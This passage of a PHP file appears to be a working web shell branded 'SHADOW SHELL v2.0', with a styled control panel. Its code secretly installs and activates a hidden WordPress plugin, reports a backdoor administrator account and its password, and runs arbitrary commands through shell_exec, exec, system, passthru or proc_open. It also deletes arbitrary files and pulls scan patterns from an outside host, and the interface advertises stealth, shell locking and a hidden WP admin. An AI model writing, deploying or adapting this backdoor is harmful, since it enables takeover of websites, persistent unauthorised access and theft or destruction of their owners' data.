            file_put_contents(
                $plugin_dir . "/shadow-plugin.php",
                $plugin_code
            );

            $stmt = $conn->prepare(
                "SELECT option_value FROM {$options_table} WHERE option_name='active_plugins'"
            );
            $stmt->execute();
            $stmt->bind_result($active_plugins);
            $stmt->fetch();
            $stmt->close();

            $plugins = @unserialize($active_plugins) ?: [];
            $plugin_path = "shadow-plugin/shadow-plugin.php";
            if (!in_array($plugin_path, $plugins)) {
                $plugins[] = $plugin_path;
                $plugins_serialized = serialize($plugins);
                $stmt = $conn->prepare(
                    "UPDATE {$options_table} SET option_value=? WHERE option_name='active_plugins'"
                );
                $stmt->bind_param("s", $plugins_serialized);
                $stmt->execute();
                $stmt->close();
            }

            echo json_encode([
                "status" => "success",
                "msg" => "✅ Admin {$admin_user} created & plugin hidden!\n🔑 Password: {$admin_pass}",
            ]);
            exit();
            break;

        case "shadowapi_scan":
            if (isset($_GET["stream"])) {
                ignore_user_abort(true);
                set_time_limit(0);
                header("Content-Type: text/event-stream");
                header("Cache-Control: no-cache");
                header("X-Accel-Buffering: no");
                header("Access-Control-Allow-Origin: *");
                header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
                header("Access-Control-Allow-Headers: Content-Type");
                @ob_end_flush();
                @ob_start();
                $root = rtrim($_SERVER["DOCUMENT_ROOT"], "/");
                $json = @file_get_contents(
                    "https://dev.artikelspiner.id/pattren_all_levels.json"
                );
                $decoded = json_decode($json, true);
                $activeLevels = ["dangerous", "medium", "smooth"];
                if (isset($_GET["active_levels"])) {
                    $activeLevels = explode(",", $_GET["active_levels"]);
                }
                $allowed_extensions = ["php", "html", "htm"];
                function sendEvent($data)
                {
                    echo "data:" . json_encode($data) . "\n\n";
                    @ob_flush();
                    @flush();
                    usleep(20000);
                }
                function deep_scan(
                    $dir,
                    $decoded,
                    $activeLevels,
                    $allowed_extensions,
                    $depth = 0,
                    $max_depth = 10
                ) {
                    if ($depth > $max_depth) {
                        return;
                    }
                    $items = @scandir($dir);
                    if (!$items) {
                        return;
                    }
                    foreach ($items as $item) {
                        if ($item === "." || $item === "..") {
                            continue;
                        }
                        $path = $dir . DIRECTORY_SEPARATOR . $item;
                        if (is_dir($path)) {
                            deep_scan(
                                $path,
                                $decoded,
                                $activeLevels,
                                $allowed_extensions,
                                $depth + 1,
                                $max_depth
                            );
                        } elseif (is_file($path)) {
                            $ext = strtolower(
                                pathinfo($path, PATHINFO_EXTENSION)
                            );
                            if (!in_array($ext, $allowed_extensions)) {
                                continue;
                            }
                            $handle = @fopen($path, "r");
                            if (!$handle) {
                                continue;
                            }
                            while (($line = fgets($handle)) !== false) {
                                foreach ($decoded as $level => $patterns) {
                                    if (!in_array($level, $activeLevels)) {
                                        continue;
                                    }
                                    foreach ($patterns as $p) {
                                        if (stripos($line, $p) !== false) {
                                            sendEvent([
                                                "file" => $path,
                                                "match" => $p,
                                                "level" => $level,
                                            ]);
                                            break 3;
                                        }
                                    }
                                }
                            }
                            fclose($handle);
                        }
                    }
                }
                sendEvent(["start" => true]);
                deep_scan($root, $decoded, $activeLevels, $allowed_extensions);
                sendEvent(["done" => true]);
                exit();
            }
            if (
                $_SERVER["REQUEST_METHOD"] === "POST" &&
                ($_POST["action"] ?? "") === "delete"
            ) {
                $files = $_POST["files"] ?? [];
                $deleted = [];
                foreach ($files as $file) {
                    if (is_file($file)) {
                        @unlink($file);
                        $deleted[] = $file;
                    }
                }
                echo json_encode(["deleted" => $deleted]);
                exit();
            }
            break;
    }
    echo json_encode($res);
    exit();
}

if (!function_exists("shadow_logError")) {
    function shadow_logError($msg)
    {
        return ["status" => "error", "message" => $msg];
    }
}

if (
    $_SERVER["REQUEST_METHOD"] === "POST" ||
    isset($_GET["stream"]) ||
    (isset($_POST["cmd"]) && $_POST["cmd"] !== "")
) {
    header("Content-Type: application/json");
    $cmd = $_POST["cmd"] ?? "";
    $target = $_POST["target"] ?? "";
    $dest = $_POST["dest"] ?? "";
    $current = $_POST["current"] ?? getcwd();
    $action = $_POST["action"] ?? "";
    $files = $_POST["files"] ?? [];
    $stream = $_GET["stream"] ?? null;
    $activeLevels = $_GET["active_levels"] ?? "dangerous,medium,smooth";
    $activeLevels = explode(",", $activeLevels);
    
    if ($action === "delete" && !empty($files)) {
        $deleted = [];
        foreach ($files as $file) {
            if (is_file($file)) {
                @unlink($file);
                $deleted[] = $file;
            }
        }
        echo json_encode(["deleted" => $deleted]);
        exit();
    }
    
    if ($cmd === "terminal") {
    $cmd_input = $_POST["command"] ?? "";
    if ($cmd_input) {
        $output = "";
        
        // Coba semua metode
        if(function_exists("shell_exec")){
            $output = @shell_exec($cmd_input . " 2>&1");
            
        } elseif(function_exists("exec")){
            $arr = [];
            @exec($cmd_input . " 2>&1", $arr);
            $output = implode("\n", $arr);
            
        } elseif(function_exists("system")){
            ob_start();
            @system($cmd_input . " 2>&1");
            $output = ob_get_clean();
            
        } elseif(function_exists("passthru")){
            ob_start();
            @passthru($cmd_input . " 2>&1");
            $output = ob_get_clean();
            
        } elseif(function_exists("proc_open")){
            // Menggunakan proc_open yang diperbaiki
            $descriptors = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"]
            ];
            
            $process = @proc_open($cmd_input . " 2>&1", $descriptors, $pipes);
            
            if(is_resource($process)){
                fclose($pipes[0]); // Tutup stdin
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        }
        
        echo json_encode(
            ($output !== false && $output !== null && trim($output) !== "")
                ? ["status" => "success", "output" => $output]
                : shadow_logError("Failed to execute command")
        );
        exit();
    }
}
    
    if ($cmd === "shadowapi_scan" || $stream) {
        ignore_user_abort(true);
        set_time_limit(0);
        header("Content-Type: text/event-stream");
        header("Cache-Control: no-cache");
        header("X-Accel-Buffering: no");
        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: Content-Type");
        @ob_end_flush();
        @ob_start();
        $root = rtrim($_SERVER["DOCUMENT_ROOT"], "/");
        $json = @file_get_contents(
            "https://dev.artikelspiner.id/pattren_all_levels.json"
        );
        $decoded = json_decode($json, true);
        $allowed_extensions = ["php", "html", "htm"];
        function sendEvent($data)
        {
            echo "data:" . json_encode($data) . "\n\n";
            @ob_flush();
            @flush();
            usleep(20000);
        }
        function deep_scan(
            $dir,
            $decoded,
            $activeLevels,
            $allowed_extensions,
            $depth = 0,
            $max_depth = 10
        ) {
            if ($depth > $max_depth) {
                return;
            }
            $items = @scandir($dir);
            if (!$items) {
                return;
            }
            foreach ($items as $item) {
                if ($item === "." || $item === "..") {
                    continue;
                }
                $path = $dir . DIRECTORY_SEPARATOR . $item;
                if (is_dir($path)) {
                    deep_scan(
                        $path,
                        $decoded,
                        $activeLevels,
                        $allowed_extensions,
                        $depth + 1,
                        $max_depth
                    );
                } elseif (is_file($path)) {
                    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
                    if (!in_array($ext, $allowed_extensions)) {
                        continue;
                    }
                    $handle = @fopen($path, "r");
                    if (!$handle) {
                        continue;
                    }
                    while (($line = fgets($handle)) !== false) {
                        foreach ($decoded as $level => $patterns) {
                            if (!in_array($level, $activeLevels)) {
                                continue;
                            }
                            foreach ($patterns as $p) {
                                if (stripos($line, $p) !== false) {
                                    sendEvent([
                                        "file" => $path,
                                        "match" => $p,
                                        "level" => $level,
                                    ]);
                                    break 3;
                                }
                            }
                        }
                    }
                    fclose($handle);
                }
            }
        }
        sendEvent(["start" => true]);
        deep_scan($root, $decoded, $activeLevels, $allowed_extensions);
        sendEvent(["done" => true]);
        exit();
    }
    echo json_encode($res ?? shadow_logError("Unknown"));
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🌑 SHADOW SHELL v2.0</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;600&family=Share+Tech+Mono&display=swap');

:root {
    --primary: #888888;
    --secondary: #666666;
    --accent: #555555;
    --bg-dark: #000000;
    --bg-darker: #050505;
    --text: #a0a0a0;
}

* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    background: linear-gradient(135deg, var(--bg-dark) 0%, #0a0a0a 50%, #050505 100%);
    color: var(--text);
    font-family: 'Share Tech Mono', monospace;
    min-height: 100vh;
    overflow-x: hidden;
}

/* Animated Background */
.shadow-bg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: 
        radial-gradient(circle at 20% 30%, rgba(100, 100, 100, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 80% 70%, rgba(80, 80, 80, 0.03) 0%, transparent 50%),
        radial-gradient(circle at 40% 80%, rgba(60, 60, 60, 0.02) 0%, transparent 50%);
    z-index: -2;
}

.shadow-grid {
    background-image: 
        linear-gradient(rgba(100, 100, 100, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(100, 100, 100, 0.03) 1px, transparent 1px);
    background-size: 40px 40px;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: -1;
    animation: gridMove 30s linear infinite;
}

@keyframes gridMove {
    0% { transform: translate(0, 0); }
    100% { transform: translate(40px, 40px); }
}

/* Glow Effects */
.glow {
    text-shadow: 0 0 5px currentColor;
}

.shadow-box {
    box-shadow: 0 0 15px rgba(50, 50, 50, 0.2);
}

.strong-shadow {
    box-shadow: 0 0 25px rgba(30, 30, 30, 0.3);
}

/* Shadow Card */
.shadow-card {
    background: rgba(20, 20, 20, 0.8);
    backdrop-filter: blur(10px);
    border: 1px solid rgba(100, 100, 100, 0.2);
    border-radius: 8px;
    transition: all 0.3s ease;
}

.shadow-card:hover {
    border-color: var(--primary);
    box-shadow: 0 0 25px rgba(100, 100, 100, 0.2);
    transform: translateY(-1px);
}

/* Shadow Button */
.shadow-btn {
    background: linear-gradient(135deg, rgba(50, 50, 50, 0.1) 0%, rgba(30, 30, 30, 0.1) 100%);
    border: 1px solid rgba(100, 100, 100, 0.3);
    color: var(--primary);
    padding: 10px 20px;
    border-radius: 6px;
    font-weight: 600;
    letter-spacing: 0.5px;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
}

.shadow-btn::before {
    content: '';
    position: absolute;
    top: 0;
    left: -100%;
    width: 100%;
    height: 100%;
    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
    transition: left 0.5s ease;
}

.shadow-btn:hover::before {
    left: 100%;
}

.shadow-btn:hover {
    background: linear-gradient(135deg, rgba(60, 60, 60, 0.2) 0%, rgba(40, 40, 40, 0.2) 100%);
    border-color: var(--primary);
    box-shadow: 0 0 20px rgba(100, 100, 100, 0.3);
    transform: translateY(-2px);
    color: #fff;
}

.shadow-btn-danger {
    border-color: rgba(150, 50, 50, 0.3);
    color: #aa5555;
}

.shadow-btn-danger:hover {
    border-color: #aa5555;
    box-shadow: 0 0 20px rgba(150, 50, 50, 0.3);
}

.shadow-btn-success {
    border-color: rgba(50, 150, 50, 0.3);
    color: #55aa55;
}

.shadow-btn-success:hover {
    border-color: #55aa55;
    box-shadow: 0 0 20px rgba(50, 150, 50, 0.3);
}

/* Scrollbar */
::-webkit-scrollbar {
    width: 8px;
    height: 8px;
}

::-webkit-scrollbar-track {
    background: rgba(0, 0, 0, 0.2);
    border-radius: 4px;
}

::-webkit-scrollbar-thumb {
    background: linear-gradient(135deg, var(--primary), var(--secondary));
    border-radius: 4px;
}

::-webkit-scrollbar-thumb:hover {
    background: linear-gradient(135deg, var(--accent), var(--primary));
}

/* Floating Elements */
.floating {
    position: fixed;
    border-radius: 50%;
    background: radial-gradient(circle, rgba(100,100,100,0.05) 0%, transparent 70%);
    z-index: -1;
}

.float-1 { width: 100px; height: 100px; top: 20%; left: 10%; animation: float1 20s infinite linear; }
.float-2 { width: 150px; height: 150px; bottom: 30%; right: 15%; animation: float2 25s infinite linear; }
.float-3 { width: 80px; height: 80px; top: 60%; left: 80%; animation: float3 30s infinite linear; }

@keyframes float1 { 
    0%, 100% { transform: translate(0,0) rotate(0deg); } 
    50% { transform: translate(100px,100px) rotate(180deg); } 
}

@keyframes float2 { 
    0%, 100% { transform: translate(0,0) rotate(0deg); } 
    50% { transform: translate(-100px,-100px) rotate(-180deg); } 
}

@keyframes float3 { 
    0%, 100% { transform: translate(0,0) rotate(0deg); } 
    50% { transform: translate(-150px,50px) rotate(360deg); } 
}

/* Terminal Style */
.terminal {
    background: rgba(10, 10, 10, 0.95);
    border: 2px solid var(--primary);
    border-radius: 6px;
    font-family: 'JetBrains Mono', monospace;
}

.terminal-header {
    background: linear-gradient(90deg, #111111, #1a1a1a);
    border-bottom: 1px solid var(--primary);
}

.terminal-content {
    background: #050505;
}

.terminal-input {
    background: transparent;
    border: none;
    outline: none;
    color: var(--primary);
}

.terminal-input:focus {
    box-shadow: none;
}

/* File List */
.file-list tr {
    transition: all 0.2s ease;
}

.file-list tr:hover {
    background: rgba(100, 100, 100, 0.05);
    transform: scale(1.002);
}

/* Status Indicators */
.status-online {
    color: #55aa55;
    text-shadow: 0 0 8px currentColor;
}

.status-offline {
    color: #aa5555;
}

/* Pulse Animation */
@keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.7; }
}

.pulse {
    animation: pulse 2s infinite;
}

/* Typewriter Effect */
.typewriter {
    overflow: hidden;
    border-right: 2px solid var(--primary);
    white-space: nowrap;
    animation: typing 3.5s steps(40, end), blink 0.75s step-end infinite;
}

@keyframes typing {
    from { width: 0 }
    to { width: 100% }
}

@keyframes blink {
    from, to { border-color: transparent }
    50% { border-color: var(--primary) }
}

/* Gradient Text */
.gradient-text {
    background: linear-gradient(90deg, #888, #666, #555);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
}

/* Shine Effect */
.shine {
    position: relative;
    overflow: hidden;
}

.shine::after {
    content: '';
    position: absolute;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: linear-gradient(
        to bottom right,
        rgba(255, 255, 255, 0) 0%,
        rgba(255, 255, 255, 0.05) 50%,
        rgba(255, 255, 255, 0) 100%
    );
    transform: rotate(30deg);
    transition: all 0.6s ease;
}

.shine:hover::after {
    left: 100%;
}

/* Loading Spinner */
.spinner {
    border: 3px solid rgba(100, 100, 100, 0.3);
    border-top: 3px solid var(--primary);
    border-radius: 50%;
    width: 40px;
    height: 40px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

/* Scan Lines */
.scanlines {
    position: relative;
    overflow: hidden;
}

.scanlines::before {
    content: "";
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: linear-gradient(
        to bottom,
        transparent 50%,
        rgba(100, 100, 100, 0.03) 51%
    );
    background-size: 100% 4px;
    z-index: 1;
    pointer-events: none;
}

/* Tooltip */
.tooltip {
    position: relative;
}

.tooltip::after {
    content: attr(data-tooltip);
    position: absolute;
    bottom: 100%;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0, 0, 0, 0.8);
    color: white;
    padding: 5px 10px;
    border-radius: 4px;
    font-size: 12px;
    white-space: nowrap;
    opacity: 0;
    transition: opacity 0.3s;
    pointer-events: none;
}

.tooltip:hover::after {
    opacity: 1;
}

/* Progress Bar */
.progress {
    background: rgba(100, 100, 100, 0.1);
    border-radius: 4px;
    overflow: hidden;
}

.progress-bar {
    background: linear-gradient(90deg, #666, #555);
    height: 100%;
    transition: width 0.3s ease;
}

/* Silent Mode Indicator */
.silent-mode {
    animation: silentPulse 3s infinite;
}

@keyframes silentPulse {
    0%, 100% { opacity: 0.5; }
    50% { opacity: 0.8; }
}
</style>
</head>
<body class="scanlines">
    <!-- Animated Background Elements -->
    <div class="shadow-bg"></div>
    <div class="shadow-grid"></div>
    <div class="floating float-1"></div>
    <div class="floating float-2"></div>
    <div class="floating float-3"></div>

    <!-- Main Container -->
    <div class="container mx-auto px-4 py-6 max-w-7xl">
        <!-- Header -->
        <div class="shadow-card p-6 mb-6 strong-shadow">
            <div class="flex flex-col md:flex-row justify-between items-center gap-4">
                <div class="text-center md:text-left">
                    <h1 class="text-4xl font-bold gradient-text glow mb-2">
                        <i class="fas fa-moon mr-2"></i>SHADOW SHELL v2.0
                    </h1>
                    <p class="text-gray-400 font-mono">
                        <span class="typewriter">🌑 Silent Mode Active • Stealth Protocol Engaged</span>
                    </p>
                </div>
                <div class="flex items-center gap-4">
                    <div class="text-right">
                        <div class="text-sm text-gray-500">Session ID</div>
                        <div class="font-bold text-green-600"><?= substr(md5(session_id()), 0, 12) ?></div>
                    </div>
                    <button onclick="window.location.href='?logout=1'" 
                            class="shadow-btn shadow-btn-danger">
                        <i class="fas fa-sign-out-alt mr-2"></i>Logout
                    </button>
                </div>
            </div>
        </div>

        <!-- System Info Dashboard -->
        <div class="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
            <!-- System Card -->
            <div class="shadow-card p-5 shine">
                <h2 class="text-xl font-bold text-gray-400 mb-4 flex items-center gap-2">
                    <i class="fas fa-microchip"></i> System Diagnostics
                </h2>
                <div class="space-y-3">
                    <div class="flex justify-between items-center border-b border-gray-800/30 pb-2">
                        <span class="text-gray-500">OS Kernel</span>
                        <span class="font-mono text-green-600"><?= htmlspecialchars($uname) ?></span>
                    </div>
                    <div class="flex justify-between items-center border-b border-gray-800/30 pb-2">
                        <span class="text-gray-500">User/Group</span>
                        <span class="font-mono text-purple-400"><?= "$uid [$user] / $gid" ?></span>
                    </div>
                    <div class="flex justify-between items-center border-b border-gray-800/30 pb-2">
                        <span class="text-gray-500">PHP Engine</span>
                        <span class="font-mono text-yellow-400">v<?= $phpver ?> <span class="text-xs <?= $safemode === 'ON' ? 'status-offline' : 'status-online' ?>">[Safe: <?= $safemode ?>]</span></span>
                    </div>
                    <div class="flex justify-between items-center border-b border-gray-800/30 pb-2">
                        <span class="text-gray-500">Network Nodes</span>
                        <span class="font-mono text-blue-400">
                            Server: <?= $serverIP ?> • You: <?= $yourIP ?>
                        </span>
                    </div>
                    <div class="flex justify-between items-center">
                        <span class="text-gray-500">System Time</span>
                        <span class="font-mono text-pink-400 pulse"><?= $dateTime ?></span>
                    </div>
                </div>
            </div>

            <!-- Resources Card -->
            <div class="shadow-card p-5 shine">
                <h2 class="text-xl font-bold text-gray-400 mb-4 flex items-center gap-2">
                    <i class="fas fa-server"></i> Resource Monitor
                </h2>
                <div class="space-y-4">
                    <!-- Disk Usage -->
                    <div>
                        <div class="flex justify-between mb-1">
                            <span class="text-gray-500">Storage Matrix</span>
                            <span class="font-mono text-green-600"><?= $diskFree ?> / <?= $diskTotal ?></span>
                        </div>
                        <div class="progress h-2">
                            <div class="progress-bar" style="width: <?= $diskPercent ?>"></div>
                        </div>
                        <div class="text-right text-xs text-gray-400 mt-1">
                            <?= $diskPercent ?> Free Space
                        </div>
                    </div>

                    <!-- Tools Available -->
                    <div>
                        <div class="text-gray-500 mb-2">Available Tools</div>
                        <div class="flex flex-wrap gap-2">
                            <?php foreach ($useful as $u): ?>
                                <span class="px-3 py-1 bg-gray-900/30 border border-gray-700/50 rounded-full text-xs text-gray-300">
                                    <i class="fas fa-toolbox mr-1"></i><?= $u ?>
                                </span>
                            <?php endforeach; ?>
                        </div>
                    </div>

                    <!-- Downloaders -->
                    <div>
                        <div class="text-gray-500 mb-2">Network Protocols</div>
                        <div class="flex flex-wrap gap-2">
                            <?php foreach ($downloaders as $d): ?>
                                <span class="px-3 py-1 bg-gray-900/30 border border-gray-700/50 rounded-full text-xs text-gray-300">
                                    <i class="fas fa-download mr-1"></i><?= $d ?>
                                </span>
                            <?php endforeach; ?>
                        </div>
                    </div>

                    <!-- Disabled Functions -->
                    <div>
                        <div class="text-gray-500 mb-2">Security Restrictions</div>
                        <button onclick="toggleDisabled()" class="shadow-btn w-full text-sm">
                            <i class="fas fa-shield-alt mr-2"></i>
                            <?= count($disabledArray) ?> Functions Disabled
                        </button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Floating Disabled Functions Panel -->
        <?php if ($disabledArray): ?>
        <div id="disabledPanel" class="hidden shadow-card p-4 mb-6 absolute top-24 right-6 w-80 z-50 strong-shadow">
            <div class="flex justify-between items-center mb-3">
                <h3 class="text-lg font-bold text-red-500">
                    <i class="fas fa-ban mr-2"></i>Disabled Functions
                </h3>
                <button onclick="toggleDisabled()" class="text-gray-400 hover:text-gray-300">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="max-h-60 overflow-y-auto">
                <?php foreach ($disabledArray as $df): ?>
                    <div class="px-3 py-2 mb-2 bg-red-900/20 border border-red-800/30 rounded text-sm font-mono">
                        <i class="fas fa-lock mr-2 text-red-500"></i><?= $df ?>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
        <?php endif; ?>

        <!-- File Manager Toolbar -->
        <div class="shadow-card p-4 mb-6">
            <div class="flex flex-col md:flex-row gap-4 items-center justify-between">
                <!-- Quick Actions -->
                <div class="flex flex-wrap gap-3">
                    <div class="relative group">
                        <input type="text" id="newfolder" placeholder="New Folder" 
                               class="shadow-btn bg-transparent border-dashed text-center w-40">
                        <div class="tooltip absolute bottom-full mb-2 hidden group-hover:block bg-gray-900 text-xs p-2 rounded">
                            Enter folder name
                        </div>
                    </div>
                    <button onclick="mkdir()" class="shadow-btn shadow-btn-success">
                        <i class="fas fa-folder-plus mr-2"></i>Create
                    </button>

                    <div class="relative group">
                        <input type="text" id="newfile" placeholder="New File" 
                               class="shadow-btn bg-transparent border-dashed text-center w-40">
                    </div>
                    <button onclick="makefile()" class="shadow-btn">
                        <i class="fas fa-file-code mr-2"></i>Create
                    </button>
                </div>

                <!-- Action Buttons -->
                <div class="flex flex-wrap gap-3">
                    <button id="uploadBtn" class="shadow-btn">
                        <i class="fas fa-cloud-upload-alt mr-2"></i>Upload
                    </button>
                    <button onclick="loadDir(currentPath)" class="shadow-btn">
                        <i class="fas fa-sync-alt mr-2"></i>Refresh
                    </button>
                    <button id="terminalBtn" class="shadow-btn shadow-btn-success">
                        <i class="fas fa-terminal mr-2"></i>Terminal
                    </button>
                </div>
            </div>

            <!-- Advanced Tools -->
            <div class="mt-4 pt-4 border-t border-gray-800/30">
                <div class="flex flex-wrap gap-3 justify-center">
                    <button id="lockShellBtn" class="shadow-btn">
                        <i class="fas fa-lock mr-2"></i>Lock Shell
                    </button>
                    <button id="unlockShellBtn" class="shadow-btn shadow-btn-danger">
                        <i class="fas fa-unlock mr-2"></i>Unlock Shell
                    </button>
                    <button id="shellScanner" class="shadow-btn">
                        <i class="fas fa-search mr-2"></i>Scanner
                    </button>
                    <button id="adminerBtn" class="shadow-btn">
                        <i class="fas fa-database mr-2"></i>Adminer
                    </button>
                    <button id="hiddenwpBtn" class="shadow-btn">
                        <i class="fab fa-wordpress mr-2"></i>WP Admin
                    </button>
                </div>
            </div>
        </div>

        <!-- Breadcrumb Navigation -->
        <div id="breadcrumb" class="shadow-card p-3 mb-4 flex flex-wrap items-center gap-2 text-sm">
            <!-- Dynamic breadcrumb will be loaded here -->
        </div>

        <!-- File List Container -->
        <div class="shadow-card p-0 overflow-hidden">
            <div class="terminal-header p-3 flex justify-between items-center">
                <div class="flex items-center gap-3">
                    <div class="spinner" id="table-loader" style="display: none;"></div>
                    <h3 class="font-bold text-gray-400">
                        <i class="fas fa-folder-open mr-2"></i>File System
                    </h3>
                </div>
                <div class="text-sm text-gray-500">
                    <span id="fileCount">0 items</span>
                </div>
            </div>
            
            <div class="overflow-x-auto">
                <table class="w-full file-list">
                    <thead class="bg-gray-900/20">
                        <tr>
                            <th class="p-3 text-left">Name</th>
                            <th class="p-3 text-center">Type</th>
                            <th class="p-3 text-center">Size</th>
                            <th class="p-3 text-center">Modified</th>
                            <th class="p-3 text-center">Permissions</th>
                            <th class="p-3 text-center">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="filelistBody">
                        <!-- Files will be loaded here -->
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Footer -->
        <div class="shadow-card p-4 mt-6 text-center">
            <div class="flex flex-col md:flex-row justify-between items-center gap-4">
                <div class="text-gray-500 text-sm">
                    <i class="fas fa-code mr-2"></i>SHADOW Framework • SHADOW SHELL v2.0
                </div>
                <div class="flex gap-4">
                    <span class="text-green-600 text-sm silent-mode">
                        <i class="fas fa-circle mr-1"></i>Silent
                    </span>
                    <span class="text-sm text-gray-500">
                        Session: <?= date('H:i:s') ?>
                    </span>
                </div>
            </div>
        </div>
    </div>

    <!-- Hidden File Input -->
    <input type="file" id="uploadfile" multiple class="hidden">

    <!-- Floating Terminal -->
    <div id="floatingTerminal" class="terminal fixed bottom-4 right-4 w-3/4 max-w-2xl h-96 hidden" style="z-index: 1000;">
        <div class="terminal-header p-3 flex justify-between items-center cursor-move" id="terminalHeader">
            <div class="flex items-center gap-2">
                <i class="fas fa-terminal text-green-600"></i>
                <span class="font-bold">Shadow Terminal</span>
            </div>
            <div class="flex gap-2">
                <button class="text-gray-400 hover:text-gray-300">
                    <i class="fas fa-window-minimize"></i>
                </button>
                <button id="floatingTerminalClose" class="text-red-500 hover:text-red-400">
                    <i class="fas fa-times"></i>
                </button>
            </div>
        </div>
        <div id="floatingTerminalContent" class="terminal-content p-4 h-80 overflow-y-auto font-mono text-sm"></div>
        <div class="p-3 border-t border-gray-800">
            <div class="flex items-center">
                <span class="text-green-600 mr-2">$</span>
                <input type="text" id="floatingTerminalInput" class="terminal-input flex-1" 
                       placeholder="Enter command...">
            </div>
        </div>
    </div>

    <!-- File Editor Modal -->
    <div id="fileModal" class="hidden fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
        <div class="shadow-card w-full max-w-4xl max-h-[90vh] flex flex-col">
            <div class="terminal-header p-4 flex justify-between items-center">
                <h3 class="text-xl font-bold text-gray-400">
                    <i class="fas fa-edit mr-2"></i>Edit File
                </h3>
                <div class="flex gap-2">
                    <button onclick="saveFile()" class="shadow-btn shadow-btn-success">
                        <i class="fas fa-save mr-2"></i>Save
                    </button>
                    <button onclick="closeModal()" class="shadow-btn shadow-btn-danger">
                        <i class="fas fa-times mr-2"></i>Close
                    </button>
                </div>
            </div>
            <div class="flex-1 overflow-hidden">
                <textarea id="fileContent" class="w-full h-full p-4 bg-black/50 text-green-500 font-mono resize-none border-none outline-none"></textarea>
            </div>
        </div>
    </div>

    <!-- Scanner Modal -->
    <div id="scannerModal" class="hidden fixed inset-0 bg-black/95 z-50 p-4 overflow-auto">
        <!-- Scanner content will be loaded here -->
    </div>

    <!-- WP Admin Modal -->
    <div id="wpAdminModal" class="hidden fixed inset-0 bg-black/90 z-50 p-4 overflow-auto">
        <!-- WP Admin content will be loaded here -->
    </div>

    <!-- Notification Container -->
    <div id="notif" class="fixed top-4 right-4 z-50 space-y-2 max-w-md"></div>

    <script>
    // ===== Variables =====
    let currentPath = "<?= htmlspecialchars($currentPath, ENT_QUOTES) ?>";
    let editingFile = '';
    let terminalDragging = false;
    let terminalOffset = {x: 0, y: 0};

    // ===== Enhanced Notifications =====
    function showNotif(msg, type = 'info') {
        const types = {
            success: {bg: 'bg-gradient-to-r from-green-900/20 to-emerald-900/20', icon: '✅', border: 'border-green-800/50'},
            error: {bg: 'bg-gradient-to-r from-red-900/20 to-pink-900/20', icon: '❌', border: 'border-red-800/50'},
            warning: {bg: 'bg-gradient-to-r from-yellow-900/20 to-orange-900/20', icon: '⚠️', border: 'border-yellow-800/50'},
            info: {bg: 'bg-gradient-to-r from-gray-900/20 to-gray-800/20', icon: 'ℹ️', border: 'border-gray-800/50'}
        };
        
        const config = types[type] || types.info;
        const id = 'n' + Date.now();
        
        const notif = $(`
            <div id="${id}" class="shadow-card p-4 mb-2 border ${config.border} ${config.bg} backdrop-blur-sm transform transition-all duration-300 translate-x-64">
                <div class="flex items-center gap-3">
                    <div class="text-2xl">${config.icon}</div>
                    <div class="flex-1 text-gray-300">${msg}</div>
                    <button onclick="$(this).parent().parent().remove()" class="text-gray-500 hover:text-gray-300">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
        `);
        
        $('#notif').append(notif);
        
        // Animation
        setTimeout(() => notif.css('transform', 'translateX(0)'), 10);
        
        // Auto remove
        setTimeout(() => {
            notif.css('transform', 'translateX(64px)');
            setTimeout(() => notif.remove(), 300);
        }, 5000);
    }

    // ===== Toggle Disabled Functions =====
    function toggleDisabled() {
        $('#disabledPanel').toggleClass('hidden');
    }

    // ===== File System Functions =====
    function ajaxPost(data, cb) {
        $.post('', data, cb, 'json').fail(() => {
            showNotif('Connection error', 'error');
        });
    }

    function showLoader() {
        $('#table-loader').show();
        $('#filelistBody').css('opacity', '0.5');
    }

    function hideLoader() {
        $('#table-loader').hide();
        $('#filelistBody').css('opacity', '1');
    }

    function loadDir(path) {
        currentPath = path;
        showLoader();
        
        ajaxPost({cmd: 'load', current: path}, function(res) {
            hideLoader();
            
            if (res.status !== 'success') {
                showNotif('Failed to load directory', 'error');
                return;
            }

            // Update breadcrumb
            $('#breadcrumb').html('');
            res.breadcrumb.forEach(b => {
                $('#breadcrumb').append(`
                    <a href="#" onclick="loadDir('${b.path}')" 
                       class="px-3 py-1 shadow-btn text-sm border-dashed text-gray-400 hover:text-gray-300">
                        ${b.name}
                    </a>
                    <span class="text-gray-600">/</span>
                `);
            });
            
            // Add home button
